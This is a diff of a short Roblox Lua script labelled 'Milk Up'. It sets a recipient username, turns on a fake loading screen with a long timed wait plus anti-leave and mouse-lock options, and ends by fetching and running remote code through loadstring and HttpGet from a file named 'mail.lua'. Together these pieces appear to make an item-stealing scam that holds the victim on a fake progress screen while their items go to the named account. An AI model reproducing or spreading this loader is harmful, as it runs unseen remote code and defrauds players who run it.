@@ -1,3 +1,15 @@
-UserName = "ZANNON_YT"
+UserName = "Wizard_CatWhite"
+UserName2 = "Wizard_CatWhite" -- optional delete the whole line if you don't want it
 
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Milk Up"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 200 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
